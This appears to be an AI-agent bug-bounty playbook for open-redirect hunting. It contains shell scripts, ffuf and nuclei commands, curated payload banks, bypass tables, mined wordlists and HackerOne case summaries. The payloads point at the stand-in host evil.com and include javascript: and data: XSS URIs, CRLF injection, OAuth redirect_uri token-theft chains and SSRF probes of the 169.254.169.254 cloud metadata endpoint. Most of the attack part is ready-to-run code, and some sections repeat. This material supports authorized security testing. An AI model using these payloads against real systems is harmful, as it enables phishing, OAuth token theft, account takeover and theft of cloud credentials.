- **Fragment-smuggling chain:** confirm the validator inspects `URL.Path` but ignores `URL.Fragment`, then show the emitted `Location` still contains the attacker host.
- **CSRF chain:** show a state-changing GET lacking CSRF actually executed in the victim account after the redirect.
- **Phishing-only severity:** if the only impact is a trusted-looking URL, report Low/Medium and don't claim ATO.
- **Client-side redirect without Location:** verify with a delayed navigation in-browser, since `curl` will show no 3xx.

### Escalation and related chains

### Escalation chains

- Open redirect -> OAuth token theft.
- Open redirect -> SSRF allowlist bypass.
- Open redirect -> phishing.

### Phase 4 — OAuth Chain Test

```bash
# If target has OAuth, check if redirect_uri accepts open redirect
grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20

# Construct OAuth URL with open redirect as redirect_uri
# Normal: redirect_uri=https://target.com/callback
# Attack: redirect_uri=https://target.com/redirect?url=https://evil.com
OAUTH_URL="https://$TARGET/oauth/authorize"
curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
```

### Phase 5 — Server-Side Redirect (SSRF escalation)

```bash
# If the app fetches the redirect target server-side (302 fetch follow)
curl -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"

# Or: if app makes HTTP request to the redirect destination
curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -H "Cookie: $SESSION"
```

---

### Chain Table

| Open redirect finding | Chain to | Impact |
|----------------------|----------|--------|
| Any open redirect | OAuth redirect_uri bypass | Auth code theft → ATO |
| Any open redirect | Phishing URL with target domain | Social engineering |
| Server-side redirect | SSRF via followed redirect | Internal service access |
| Logout redirect | Session fixation | Force login with known session |

---

### Tools and wordlists

### Tools

`Burp` · `gf redirect` · `waybackurls` · `ffuf`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_open-redirect.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_open-redirect.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect.txt` | 36 |
| `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect_waf.txt` | 26 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_open-redirect.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_open-redirect.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_open-redirect.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Feed redirect params from the wordlist; verify the final Location is off-domain.

```sh
nuclei -u https://target -tags redirect,open-redirect \
       -severity low,medium,high,critical -rl 40 -o nuclei_open-redirect.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/redirect -dast \
       -rl 40 -o nuclei_open-redirect_redirect.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_open-redirect_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class open-redirect --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class open-redirect
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class open-redirect
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class open-redirect --min-bounty 1000
```

### Related

- `hackerone-oauth-oidc` (177 reports)
- `hackerone-ssrf` (337 reports)
- `hackerone-xss` (2,569 reports)

### Related

- `oauth-oidc` (177 reports)
- `ssrf` (337 reports)
- `xss` (2,569 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://www.intigriti.com/researchers/blog/hacking-tools/open-url-redirects-a-complete-guide-to-exploiting-open-url-redirect-vulnerabilities
2. https://hacktricks.wiki/en/pentesting-web/open-redirect.html

### Additional notes

### Basic

```text
//evil.com
///evil.com
////evil.com
https://evil.com
http://evil.com
//evil.com/%2e%2e
//evil.com/path
https:evil.com
http:evil.com
\evil.com
```

### Encoding & scheme tricks

```text
javascript:alert(1)
data:text/html,<script>alert(1)</script>
//evil.com/%0d%0aLocation:%20https://evil.com
https://evil.com%2f..%2ftarget.com
https://evil.com/%2e%2e/target.com
%2f%2fevil.com
%252f%252fevil.com
https:%2f%2fevil.com
//evil.com\@target.com
//evil.com%5c@target.com
//evil.com	.target.com
//evil.com%09.target.com
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect.txt` (36)
- `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect_waf.txt` (26 filter/WAF-focused)

### Parameters observed

`url` · `next` · `redirect_uri` · `client_id` · `email` · `scope` · `response_type` · `return_to` · `return_url` · `redirect` · `feed-stats-url` · `state` · `redir` · `continue` · `redirect_url` · `remember_me` · `query` · `signature` · `page` · `redirect_to`

### [cs.money] Open Redirect Leads to Account Takeover

`#905607` · CS Money · $0 · medium · 2020-09-30 · ▲357
> I found an open redirect on https://cs.money domain, using this payload https://cs.money///google.com we can redirect into any domain that we want, you can see the request and response from this image below : ███

### XSS and Open Redirect on MoPub Login

`#683298` · X / xAI · $1,540 · n/a · 2019-09-24 · ▲248
> Summary: I found open redirect at the MoPub login page, https://app.mopub.com/login?next=https://google.com. It also allows javascript URIs, leading to XSS. Description: You can modify the "next" URL parameter to redirect to any website upon logging in on MoPub. Steps To Reproduce: 1. Take this URL: https://app.mopub.com/login?next=https://google.com 2. Change "https://google.com" to whatever URL you want to redirect to. 3. Visit the URL and login 4.

### [PayPal Android] Remote theft of user session using push_notification_webview deeplink

`#424443` · PayPal · $0 · medium · 2019-02-07 · ▲188
> A deeplink feature built into the PayPal Android application failed to validate the requested endpoint. A specifically crafted request from a website or separate app on the device could call the deeplink and direct traffic to any destination. While the impact was limited by compensating controls, headers containing sensitive data could be collected by a malicious actor.

### Open redirect at https://inventory.upserve.com/http://google.com/

`#469803` · Upserve · $1,200 · medium · 2019-06-07 · ▲179
> The following URL is vulnerable to an open redirect (it will redirect to stanko.sh): https://inventory.upserve.com/http://stanko.sh/ Impact Users could get redirected to malicious domain.

### Open Redirect in Logout & Login

`#1788006` · Expedia Group Bug Bounty · $0 · medium · 2023-03-02 · ▲171
> Entry Hello there! While browsing on expedia, I logged out of the account and as soon as I logged out, it was calling me a parameter called "rurl" directly on the link, I examined it and was able to redirect successfully. Default Request GET /?logout=1 HTTP/2 Host: www.expedia.com Cookie: { REDACTED } User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0 Accept:…

### Phase 1 — Discover Redirect Parameters

```bash
# Extract all redirect candidates from crawl
cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt
wc -l recon/$TARGET/redirect-candidates.txt

# Less common param names
grep -E "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout)" \
  recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt
```

### Phase 2 — Basic Test

```bash
COLLAB="https://evil.com"
cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
  LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
done
```

### Phase 3b — DOM-based open redirect (client-side sink)

Server-side `Location:` grepping misses redirects that happen purely in JS. Source (`location.hash`/`location.search`/`document.referrer`) assigned to a navigation sink.
```bash
grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
  | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer"
# Confirm in a browser (curl can't): open  https://$TARGET/page#https://evil.com  (or ?url=...)
# Common shape:  var u=new URLSearchParams(location.search).get('url'); location=u;
```
(PortSwigger: DOM-based open redirection.)

### Automation

```bash
# openredirex
pip3 install openredirex
openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com

# nuclei
nuclei -u https://$TARGET -t redirect/ -severity medium,high

# gf + qsreplace
cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
  xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}
```

---

## Companion methodology (complete, deduplicated)

Full text of every non-SKILL.md methodology document from the contributing skills.

### Companion: hunting / references/payloads.md

# Open Redirect — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `//evil.com` `https://target.com@evil.com` `https://target.com.evil.com`

- `https://target.com\@evil.com` `//evil.com/%2e%2e` `////evil.com`

- `javascript:alert(1)` `data:text/html,...` when the redirect is client-side

- `https://target.com/redirect?url=https://evil.com` chained



## Payload bank



**36 curated payloads** in 3 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Basic



```text

//evil.com

///evil.com

////evil.com

https://evil.com

http://evil.com

//evil.com/%2e%2e

//evil.com/path

https:evil.com

http:evil.com

\evil.com

```



### Allowlist & parser bypass



```text

https://target.com@evil.com

https://target.com.evil.com

https://target.com\@evil.com

https://target.com%2f@evil.com

https://target.com%00.evil.com

https://target.com%20.evil.com

https://target.com#@evil.com

https://target.com?@evil.com

https://evil.com#target.com

https://evil.com?target.com

https://target.com/redirect?url=https://evil.com

//target.com.evil.com

//target.com@evil.com

//target.com%2f@evil.com

```



### Encoding & scheme tricks



```text

javascript:alert(1)

data:text/html,<script>alert(1)</script>

//evil.com/%0d%0aLocation:%20https://evil.com

https://evil.com%2f..%2ftarget.com

https://evil.com/%2e%2e/target.com

%2f%2fevil.com

%252f%252fevil.com

https:%2f%2fevil.com

//evil.com\@target.com

//evil.com%5c@target.com

//evil.com	.target.com

//evil.com%09.target.com

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect.txt` (36)

- `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect_waf.txt` (26 filter/WAF-focused)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 4× | `wp_redirect()` |

| 3× | `$count = 1` |

| 3× | `<script> / window.opener.location = 'https://davidebove.com/blog/2016/05/05/target_blank-vulnerability-test-page/'; / </script>` |

| 2× | `https://cdn.kastatic.org/khanacademy/khanacademy.<hash>.js.map` |

| 2× | `str_replace( OPENVERSE_SUBPATH, '', $path, $count )` |

| 2× | `str_replace()` |

| 2× | `wp_safe_redirect()` |

| 2× | `get_target_url()` |

| 2× | `wp_sanitize_redirect()` |

| 2× | `wp_validate_redirect()` |

| 2× | `@` |

| 1× | `GET /transfer_auth?key=<TOKEN?>&continue=/ HTTP/1.1 / Host: xfarr-6fmjyrz2lq-uc-a-run.app` |

| 1× | `https://classroom.khanacademy.org/login?continue=https%3A%2F%2Fxfarr-6fmjyrz2lq-uc-a-run.app%2F` |

| 1× | `KA_DOMAIN_REGEX.test()` |

| 1× | `isKhanAcademyUrl()` |

| 1× | `maybeAddAuthTransfer()` |

| 1× | `https://xfarr-6fmjyrz2lq-uc-a-run.app/transfer_auth?key=<TOKEN>&continue=/` |

| 1× | `https://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie)/` |

| 1× | `/..//google.com` |

| 1× | `/../` |



## Parameters observed



`url` · `next` · `redirect_uri` · `client_id` · `email` · `scope` · `response_type` · `return_to` · `return_url` · `redirect` · `feed-stats-url` · `state` · `redir` · `continue` · `redirect_url` · `remember_me` · `query` · `signature` · `page` · `redirect_to`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_open-redirect.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_open-redirect.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect.txt` | 36 |

| `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect_waf.txt` | 26 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_open-redirect.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_open-redirect.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_open-redirect.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



Feed redirect params from the wordlist; verify the final Location is off-domain.



```sh

nuclei -u https://target -tags redirect,open-redirect \

       -severity low,medium,high,critical -rl 40 -o nuclei_open-redirect.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/redirect -dast \

       -rl 40 -o nuclei_open-redirect_redirect.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \

       -rl 40 -o nuclei_open-redirect_generic.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Companion: hunting / references/techniques.md

# Open Redirect — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Find redirect params: next, url, return, redirect_uri, continue, callback, dest, image_url.

- Test scheme-relative `//evil.com`, backslashes, `@`, unicode dots, and double encoding.

- Bypass allowlists with userinfo, subdomain suffix, and path confusion.

- Check login/logout, OAuth callbacks, shorteners, and mobile deep links.



## Bypass tricks



- Double URL-encode, unicode normalize, and mixed case the scheme/host.

- Use an allowlisted host with an open redirect to reach the final target.

- Exploit parser differences between validation and navigation.



## Deeper checklist



- Find redirect params: next, url, return, redirect_uri, continue, callback, dest, image_url.

- Try scheme-relative `//evil.com`, backslashes, `@`, unicode dots, and double encoding.

- Bypass allowlists with userinfo tricks, subdomain suffix, and path confusion.

- Test redirectors in OAuth/SSO flows and mobile deep links.

- Chain with OAuth token theft or SSRF allowlist bypass for higher impact.

- Confirm the browser actually navigates off-domain (not just a 302 to an error page).



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **[cs.money] Open Redirect Leads to Account Takeover** — `#905607` · CS Money · $0 · ▲357

  > Open this url `https://auth.dota.trade/login?redirectUrl=https://cs.money///loving-turing-29a494.netlify.app%2523&callbackUrl=https://cs.money///loving-turing-29a494.netlify.app%2523` , the login url was gotten from `cs.money` index page button `sign in…

- **XSS and Open Redirect on MoPub Login** — `#683298` · X / xAI · $1,540 · ▲248

  > Here's a proof of concept using the URL javascript:alert("proof of concept"):

- **[PayPal Android] Remote theft of user session using push_notification_webview deeplink** — `#424443` · PayPal · $0 · ▲188

  > A deeplink feature built into the PayPal Android application failed to validate the requested endpoint.

- **Open redirect at https://inventory.upserve.com/http://google.com/** — `#469803` · Upserve · $1,200 · ▲179

  > https://inventory.upserve.com/http://stanko.sh/

- **Open Redirect in Logout & Login** — `#1788006` · Expedia Group Bug Bounty · $0 · ▲171

  > GET /?logout=https://qx4lw1nsec.blogspot.com HTTP/2

- **[Venmo Android] Remote theft of user session** — `#401940` · PayPal · $0 · ▲151

  > Khilly highlighted a logic flaw in the Venmo app’s use of `android.net.Uri` parser, which we further explored together.

- **Open redirect due to scanning QR code via brave browser** — `#1946534` · Brave Software · $0 · ▲148

  > https://resources.infosecinstitute.com/topic/security-attacks-via-malicious-qr-codes/

- **Open Redirect on central.uber.com allows for account takeover** — `#206591` · Uber · $0 · ▲144

  > When logging into `central.uber.com`, the `state` parameter for login.uber.com contained a redirect location instead of a CSRF token.

- **Open redirect** — `#2957962` · XVIDEOS · $0 · ▲143

  > An open redirect vulnerability was discovered on the website https://www.xnxx.com/todays-selection/1.

- **1-Click Account Takeover via Open Redirect through Regex Bypass in Domain Validation** — `#3723458` · Khan Academy · $0 · ▲126

  > The issue is that dots between `uc`, `a`, `run`, and `app` are not escaped , meaning it could be any character, not necessarily a dot (`.`).

- **Open URL Redirection** — `#1238684` · Unikrn · $0 · ▲102

  > Reference: https://www.owasp.org/index.php/Unvalidated Redirects and Forwards Cheat Sheet

- **CRLF to XSS & Open Redirection** — `#2012519` · TikTok · $0 · ▲97

  > This could have led to Reflective XSS (Cross-Site Scripting) to gain access to a user's cookies, or the ability to send users to unauthorized webpages ending in "tiktok.com" via an open redirect.

- **Twitter lite(Android): Vulnerable to local file steal, Javascript injection, Open redirect** — `#499348` · X / xAI · $0 · ▲95

  > To reproduce javascript injection: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"

- **OAuth redirect uri validation bypass for :proxima_first_party_sync apps** — `#3588801` · GitHub · $0 · ▲79

  > [CVE-2026-4296](https://nvd.nist.gov/vuln/detail/CVE-2026-4296)

- **another liberapay member team twitter account broken Link Hijacking via Expired Twitter Account Link** — `#3723002` · Liberapay · $0 · ▲77

  > Hello again i discovered that there is another Liberapay profile of Liberapay team member at liberapay.com/mdvhimself contains a link to an expired Twitter account, creating a Broken Link Hijacking (BLH) vulnerability.

- **[dev.twitter.com] XSS and Open Redirect** — `#260744` · X / xAI · $1,120 · ▲75

  > XSS via Request-URI which requires user interaction.

- **Open Redirect** — `#1213580` · Affirm · $250 · ▲74

  > POC:https://www.affirm.com///google.com/?www.affirm.com/?category=interview&page=2

- **Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal in redirect parameter** — `#3599248` · Lovable VDP · $0 · ▲74

  > The server normalizes the path traversal `/../` and then treats `//google.com` as a

- **Open Redirect on ███████** — `#2265413` · Fastly VDP · $0 · ▲74

  > 3.Submit the request and observe that the page is redirected to the malicious URL.

- **open redirected by host header** — `#2828499` · Localize · $0 · ▲73

  > go to www.localizestaging.com and interpret then change host header .it will redirect to changed host header webisite

- **Open Redirect** — `#504751` · Omise · $100 · ▲72

  > GET /%2f%2f%2fbing.com%2f%3fwww.omise.co/?category=interview&page=2 HTTP/1.1

- **Identity Login Page Redirect Can Be Manipulated** — `#243474` · Inflection · $0 · ▲72

  > I used this request to try login https://www.identity.com/signin?redirect url=%2Foauth%2Fauthorize%3Fclient id%3D241f887e145f09298fc7f3459cefa080cd7abd30b7b0192977b5bb72965e0583%26redirect uri%3D%252Ftest-callback%26response…

- **Possible to redirect to a (non-existing) subdomain after logging in via GitHub (leaking the token)** — `#292825` · Ed · $0 · ▲71

  > Go to https://github.com/login/oauth/authorize?client id=5f45cc999f7812d0b6d2&redirect uri=https%3A%2F%2Fnonexisting.edoverflow.com&scope=public repo

- **Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach to blocking links** — `#1032610` · X / xAI · $560 · ▲70

  > Append the result of step 3 to `https://analytics.twitter.com/daa/0/daa optout actions?action id=4&rd=` and append `%3F` to the result: `https://analytics.twitter.com/daa/0/daa optout actions?action id=4&rd=https%3A%2F%2Fddosecrets%25E3%2580%2582com%3F`.

- **Open Redirect Vulnerability in OAuth Flow Leading to Potential Phishing Attack** — `#3099816` · Lichess · $0 · ▲70

  > Change this from`redirect uri=https://www.lichess4545.com/auth/lichess/` to `redirect uri=https://example.com/auth/lichess/`

- **Google API key leaks and security misconfiguration leads Open Redirect Vulnerability** — `#1066410` · Clario · $300 · ▲68

  > Hello, when i search your targets and javascript files I found an googleapikey leaks in url = [https://account.clario.co/js/main.044af6485f6b0cd90809.js](https://account.clario.co/js/main.044af6485f6b0cd90809.js "Url").

- **Stealing Users OAuth Tokens through redirect_uri parameter** — `#665651` · GSA Bounty · $750 · ▲67

  > 1, Clicked on link https://login.fr.cloud.gov/oauth/authorize?client id=███&response type=token&redirect uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███

- **Liberapay member team twitter account broken Link Hijacking via Expired Twitter Account Link** — `#3721519` · Liberapay · $0 · ▲65

  > Click on the Twitter link https://x.com/martinodelilo

- **Open redirect using theme install** — `#101962` · Shopify · $0 · ▲61

  > Vulnerable Endpoint - https://app.shopify.com/services/google/themes/preview/supply--blue?domain name=example.com

- **Multiple Open Redirect on TikTok domains** — `#2221547` · TikTok · $0 · ▲61

  > An open redirection vulnerability was found via a path traversal on the 'redirect url' parameter when logging in on a TikTok Seller domain, which could have resulted in takeover of a TikTok Seller account.



## Case studies



### [cs.money] Open Redirect Leads to Account Takeover

`#905607` · CS Money · $0 · medium · 2020-09-30 · ▲357

> I found an open redirect on https://cs.money domain, using this payload https://cs.money///google.com we can redirect into any domain that we want, you can see the request and response from this image below : ███



### XSS and Open Redirect on MoPub Login

`#683298` · X / xAI · $1,540 · n/a · 2019-09-24 · ▲248

> Summary: I found open redirect at the MoPub login page, https://app.mopub.com/login?next=https://google.com. It also allows javascript URIs, leading to XSS. Description: You can modify the "next" URL parameter to redirect to any website upon logging in on MoPub. Steps To Reproduce: 1. Take this URL: https://app.mopub.com/login?next=https://google.com 2. Change "https://google.com" to whatever URL you want to redirect to. 3. Visit the URL and login 4.



### [PayPal Android] Remote theft of user session using push_notification_webview deeplink

`#424443` · PayPal · $0 · medium · 2019-02-07 · ▲188

> A deeplink feature built into the PayPal Android application failed to validate the requested endpoint. A specifically crafted request from a website or separate app on the device could call the deeplink and direct traffic to any destination. While the impact was limited by compensating controls, headers containing sensitive data could be collected by a malicious actor.



### Open redirect at https://inventory.upserve.com/http://google.com/

`#469803` · Upserve · $1,200 · medium · 2019-06-07 · ▲179

> The following URL is vulnerable to an open redirect (it will redirect to stanko.sh): https://inventory.upserve.com/http://stanko.sh/ Impact Users could get redirected to malicious domain.



### Open Redirect in Logout & Login

`#1788006` · Expedia Group Bug Bounty · $0 · medium · 2023-03-02 · ▲171

> Entry Hello there! While browsing on expedia, I logged out of the account and as soon as I logged out, it was calling me a parameter called "rurl" directly on the link, I examined it and was able to redirect successfully. Default Request GET /?logout=1 HTTP/2 Host: www.expedia.com Cookie: { REDACTED } User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0 Accept:…



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class open-redirect --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class open-redirect

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class open-redirect

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class open-redirect --min-bounty 1000

```



## Bypass Table



| Technique | Payload |

|-----------|---------|

| Basic | `https://evil.com` |

| Protocol relative | `//evil.com` |

| Backslash bypass | `/\\evil.com` |

| At-sign confusion | `https://target.com@evil.com` |

| Double slash | `//evil.com/%2F..` |

| URL encoding | `%2Fevil.com` |

| Null byte | `evil.com%00target.com` |

| Whitespace | `evil.com%09` or `%20` |

| JavaScript URI | `javascript:window.location='https://evil.com'` |

| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |

| Subdomain | `https://target.com.evil.com` |

| Fragment | `https://evil.com#.target.com` |



---

## Corpus payload bank (curated)

### Basic

```text
//evil.com
///evil.com
////evil.com
https://evil.com
http://evil.com
//evil.com/%2e%2e
//evil.com/path
https:evil.com
http:evil.com
\evil.com
```

### Allowlist & parser bypass

```text
https://target.com@evil.com
https://target.com.evil.com
https://target.com\@evil.com
https://target.com%2f@evil.com
https://target.com%00.evil.com
https://target.com%20.evil.com
https://target.com#@evil.com
https://target.com?@evil.com
https://evil.com#target.com
https://evil.com?target.com
https://target.com/redirect?url=https://evil.com
//target.com.evil.com
//target.com@evil.com
//target.com%2f@evil.com
```

### Encoding & scheme tricks

```text
javascript:alert(1)
data:text/html,<script>alert(1)</script>
//evil.com/%0d%0aLocation:%20https://evil.com
https://evil.com%2f..%2ftarget.com
https://evil.com/%2e%2e/target.com
%2f%2fevil.com
%252f%252fevil.com
https:%2f%2fevil.com
//evil.com\@target.com
//evil.com%5c@target.com
//evil.com	.target.com
//evil.com%09.target.com
```

## Corpus wordlists (mined)

### `params_open-redirect.txt`

```text
url
next
redirect_uri
client_id
email
scope
response_type
return_to
return_url
redirect
feed-stats-url
state
redir
continue
redirect_url
remember_me
query
signature
page
redirect_to
pub_secret
host
EQ
subject
to
key
category
id
path
uuid
shop
URL
sa
redirectUrl
code
redirect_after_login
action_id
rd
link
popup
consumer_key
callback_url
ref_url
nonce
prejoin_data
action
g-recaptcha-response
prefn1
goto
rank
result_gid
result_url
search_uuid
suggested
post_logout_redirect_uri
endpoint
source
api_key
file
full_number
referrer
slug
logout
domain_name
origin
dl
datestamp
version
hosts
consentId
interactionCount
landingPath
groups
noredirect
unsafe_link
color_scheme
color_sheme
checkout_url
campaign
adgroup
creative
fallback
locale_id
return
login
profile
success
failed
ticket_form_id
name
email_confirm
participants
description
organization
timeframe
timezone
agreement
error
prefv1
hmac
timestamp
apikeyrefresh
usp
weg_digest
id_token_hint
reauth
pr
prox
rorder
rprox
rdfreq
rwfreq
rlead
rdepth
sufs
order
message
screen_name
callbackUrl
token
_rsc
prompt
mode
illust_id
debugEnabled
ctx
evt
exp
checksum
disposition
dos_poc
attr[Domain]
resource_name
product_code
password
op
target_screen_name
authorize_callback
location
redirection_url
asset
sdk
isteacher
referral
redirecturl
authenticity_token
parameter
display
expires_in
requestTokenAndRedirect
```

### `paths_open-redirect.txt`

```text
/login
/global/identity
/data/definitions/601.html
/redirect
/go
/ama
/mc/
/authorize/
/checkcookie
/accounts
/link
/auth/post-login
/oauth/authorize
/logout
/wp-includes/js/swfupload/swfupload.swf
/Redirect.aspx
/account/login/
/exit.php
/partners/apex/Cloud_chat
/index.php/apps/files_pdfviewer
/todays-selection/1
/transfer_auth
/Liberapay/
/%5C
/signin
/auth/login/
/linkfilter/
/novel/show.php
/jump.php
/proxy_image/HTTPS%3A%2F%2Fexample.com%2F
/openverse/search/
/openverse/openverse@evil.example/login
/openverse
/search/
/account/login
/v2/auth/authorize
/d4ffbnr
/login/
/css
/public.php
/2013/05/practical-http-host-header-attacks.html
/blog/articles/automated-detection-of-host-header-attacks/
/core/oauth/auth
/coffee/coffee,de_DE,sc.html
/authorize
/admin/oauth/authorize
/search/result
/admin/oauth/redirect_from_partners_dashboard
/post
/api/iam/authn/v1/oidc/logout
/hackerone/landpage.php
/auth/shopify
/PATH_TO_EE/index.php
/accounts/login/github/
/studio/forbidden/
/cdn-cgi/l/chk_jschl
/http://stanko.sh/
/topic/security-attacks-via-malicious-qr-codes/
/todays-selection/2
/khanacademy/khanacademy
/vuln/detail/CVE-2026-4296
/mdvhimself/donate
/mdvhimself
/%2f%2f%2fbing.com%2f%3fwww.omise.co
/%2f%2f%2fbing.com%2f%3fwww.omise.co/
/en/3002/
/auth/lichess/
/blitzbattle/
/clario.co/
/martindelille
/martindelille/donate
/services/google/themes/preview/supply--blue
/admin
/fr
/login/login.do
/test/dashboard
/test/settings
/my-portal
/same.html
/web/digits/sign-in-options.html
/purchase-success
/%5Cgoogle.com
/auth/auth0
/member_illust.php
/zduxnhz
/PugOfConcept/pugOfConcept.swf
/live_video_stream/authorized_status/883213898672783361/LIVE_PUBLIC/DEHOXIMUQAEbRFW
/auth/login
/latest/meta-data/filter-id/add
/latest/meta-data/filter-id/add/
/mc
/api/2/idp/authorize/
/mc/branding-scheme.html
/hci/callback
/apps/locksmith/resource/pages/gauntlet-challenge
/cabinet/
/template-editor/
/content-hub/streamlabs-obs/search
/https:/
/proxy_image/https%3A%2F%2Fexample.com%2F
/proxy_image
/accounts/:id/exports
/print
/sNnTdUWAvh27xF-f273gMtyxvGbOnLHSflbedosO23Ns=/https://example.com/
/_saml/sloRedirect/:provider
/redirect-to
/cookies/set
/@evil.example
/openverse/@evil.example
/openverse/
/openverse/2023/02/08/openverse-org-is-live/
/x.evil.example
/ru/
/openverse/openverse@evil.example/
/landed
/openverse/openverse.evil.example/
/themes/pub/wporg-openverse/functions.php
/openverse/…
/openverse/x/openverse.evil.example
/rossiya
/user/edit
/ping/redirect_to_account
/domain/search/dragynslair.live
/reference
/tipping/purchase_success/
/css/
/connect/authorize/rsg
/Share/Person
/member/xerojuzto/feed/3073813190982488067
/Share
/member/xerojuzto
/5350b75
/517ae7c
/feed/102126489/activity/3073813190982488067
/feed/102126489/activity/2960911889698885091/share/Person/getcontent
/feed/102126489/activity/3073813190982488067/share/Person/getcontent
/some_dirs/share/Person/getcontent
/member/xerojuzto/feed/2960911889698885091
/hangzhou1year/
/2019/05/16/the-real-impact-of-an-open-redirect/
/blockstack/blockstack-core/index.html
/password
/editor
/account/logout
/authrozie/
/s/doi
/ct_quoted
/ct_plain
/ct_param_html
/ct_param_plain
```

### `payloads_open-redirect.txt`

```text
//evil.com
///evil.com
////evil.com
https://evil.com
http://evil.com
//evil.com/%2e%2e
//evil.com/path
https:evil.com
http:evil.com
\evil.com
https://target.com@evil.com
https://target.com.evil.com
https://target.com\@evil.com
https://target.com%2f@evil.com
https://target.com%00.evil.com
https://target.com%20.evil.com
